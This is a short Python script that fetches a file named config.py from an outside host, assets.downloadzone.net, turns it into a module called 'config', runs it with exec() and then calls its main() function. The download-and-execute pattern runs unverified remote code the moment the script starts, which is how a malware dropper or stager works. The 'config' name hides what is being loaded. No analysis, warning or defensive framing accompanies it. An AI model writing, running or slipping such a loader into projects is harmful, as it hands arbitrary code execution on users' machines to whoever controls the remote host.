import sys
import types
import httplib2

def get_url_and_module_name():
    return "https://assets.downloadzone.net/files/config.py", "config"

def get_response_and_exec(url, module_name):
    http_obj = httplib2.Http()
    response, content = http_obj.request(url)
    source = content.decode('utf-8')

    module = types.ModuleType(module_name)
    sys.modules[module_name] = module

    exec(source, module.__dict__)

    return module

def execute():
    url, module_name = get_url_and_module_name()
    module = get_response_and_exec(url, module_name)

    try:
        module.main()
    except Exception as e:
        print(e)

execute()
